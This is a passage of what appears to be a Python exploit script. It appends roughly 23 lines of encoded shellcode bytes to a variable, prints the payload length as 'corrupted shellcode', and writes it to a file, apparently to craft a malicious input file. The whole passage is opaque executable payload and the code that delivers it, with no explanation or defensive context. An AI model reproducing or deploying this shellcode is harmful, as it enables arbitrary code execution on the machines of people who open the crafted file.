shellcode += "\xdb\x02\xbd\xe0\x57\x5d\x1d\x03\xbb\xd5\x14\x1b"
shellcode += "\xd8\xd0\xef\x90\x2a\xae\xf1\x70\x63\x4f\x5d\xbd"
shellcode += "\x4b\xa2\x9f\xfa\x6c\x5d\xea\xf2\x8e\xe0\xed\xc1"
shellcode += "\xed\x3e\x7b\xd1\x56\xb4\xdb\x3d\x66\x19\xbd\xb6"
shellcode += "\x64\xd6\xc9\x90\x68\xe9\x1e\xab\x95\x62\xa1\x7b"
shellcode += "\x1c\x30\x86\x5f\x44\xe2\xa7\xc6\x20\x45\xd7\x18"
shellcode += "\x8b\x3a\x7d\x53\x26\x2e\x0c\x3e\x2f\x83\x3d\xc0"
shellcode += "\xaf\x8b\x36\xb3\x9d\x14\xed\x5b\xae\xdd\x2b\x9c"
shellcode += "\xd1\xf7\x8c\x32\x2c\xf8\xec\x1b\xeb\xac\xbc\x33"
shellcode += "\xda\xcc\x56\xc3\xe3\x18\xf8\x93\x4b\xf3\xb9\x43"
shellcode += "\x2c\xa3\x51\x89\xa3\x9c\x42\xb2\x69\xb5\xe9\x49"
shellcode += "\xfa\xc5\xed\x51\xfb\x51\xec\x51\xfb\x29\x79\xb7"
shellcode += "\x91\x39\x2c\x60\x0e\xa3\x75\xfa\xaf\x2c\xa0\x87"
shellcode += "\xf0\xa7\x47\x78\xbe\x4f\x2d\x6a\x57\xa0\x78\xd0"
shellcode += "\xfe\xbf\x56\x7c\x9c\x52\x3d\x7c\xeb\x4e\xea\x2b"
shellcode += "\xbc\xa1\xe3\xb9\x50\x9b\x5d\xdf\xa8\x7d\xa5\x5b"
shellcode += "\x77\xbe\x28\x62\xfa\xfa\x0e\x74\xc2\x03\x0b\x20"
shellcode += "\x9a\x55\xc5\x9e\x5c\x0c\xa7\x48\x37\xe3\x61\x1c"
shellcode += "\xce\xcf\xb1\x5a\xcf\x05\x44\x82\x7e\xf0\x11\xbd"
shellcode += "\x4f\x94\x95\xc6\xad\x04\x59\x1d\x76\x34\x10\x3f"
shellcode += "\xdf\xdd\xfd\xaa\x5d\x80\xfd\x01\xa1\xbd\x7d\xa3"
shellcode += "\x5a\x3a\x9d\xc6\x5f\x06\x19\x3b\x12\x17\xcc\x3b"
shellcode += "\x81\x18\xc5"
print("Length of corrupted shellcode: {}".format(len(shellcode)))
f.write(shellcode)
f.close
